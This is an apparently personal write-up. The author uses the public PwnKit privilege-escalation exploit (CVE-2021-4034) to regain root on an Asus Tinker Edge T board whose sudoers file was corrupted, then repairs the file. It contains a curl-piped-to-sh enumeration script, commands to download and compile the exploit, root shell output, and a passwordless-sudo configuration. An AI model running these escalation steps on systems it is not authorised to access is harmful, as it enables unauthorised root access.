# Fixing Asus Tinker Edge T corrupted sudoers with PwnKit

Vendor page: <https://tinker-board.asus.com/product/tinker-edge-t.html>

## Why?

At this moment there is bug in official Asus [**Mendel 5 Eagle V3.0.2**](https://tinker-board.asus.com/forum/index.php?/topic/14395-release-tinker-edge-t-mendel-5-eagle-v302/) OS causing unable to use `sudo` command:
```
>>> /etc/sudoers: syntax error near line 28 <<<
sudo: parse error in /etc/sudoers near line 28
sudo: no valid sudoers sources found, quitting
sudo: unable to initialize policy plugin
```
Simple speaking: file `/etc/sudoers` is corrupted somehow and you **can not run any command with `sudo`**, for example `sudo apt-get update`. There is not other option how to switch to `root` user and you are locked in low privileged user. 

Or not? :)

## Hacking time!

Lets start with [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Most valuable part:
```
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 31K Jan 10  2019 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 47K Jan 10  2019 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 59K Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root 74K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 150K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 59K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 40K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 19K Nov  8  2019 /usr/bin/weston-launch (Unknown SUID binary)
-rwsr-xr-x 1 root root 23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 415K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 46K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Binary called `polkit-agent-helper-1` caught my attention. In January 2022 vulnerability (CVE-2021-4034) in Polkit was discovered by [Qualys Research Team](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034):

> The Qualys Research Team has discovered a memory corruption vulnerability in polkit’s pkexec, a **SUID-root program that is installed by default on every major Linux distribution**. This easily exploited vulnerability allows any unprivileged user to gain full root privileges on a vulnerable host by exploiting this vulnerability in its default configuration.

So, it was pretty huge chance, that Mendel GNU/Linux (which is based on Debian GNU/Linux) is vulnerable too!

I choosed most rated exploit on Github: <https://github.com/arthepsy/CVE-2021-4034>. Usage is straightforward:

```
cd /home/mendel/
wget https://github.com/arthepsy/CVE-2021-4034/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2021-4034-main/
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
```

There should not be any error after compilation and we are ready to use exploit:
```
./cve-2021-4034-poc
```
and...
```
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),27(sudo),29(audio),44(video),46(plugdev),50(staff),60(games),100(users),103(netdev),107(input),109(render),110(i2c),112(systemd-journal),116(bluetooth),1000(mendel),1001(apex)
```
we are root!

Stabilizing shell first:
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=linux
```

Next step is fixing `/etc/sudoers` file:
```
nano /etc/sudoers
```

As you can see on line 28 are some meaningless characters:
```
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
```

Delete this line completely.

There is example of passwordless `sudo` for user is `sudo` group:
```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo  ALL=(ALL) NOPASSWD: ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

Create new SSH connection as `mendel` user and test it:
```
mendel@king-finch:~$ sudo su -
root@king-finch:~# id
uid=0(root) gid=0(root) groups=0(root)
root@king-finch:~#
```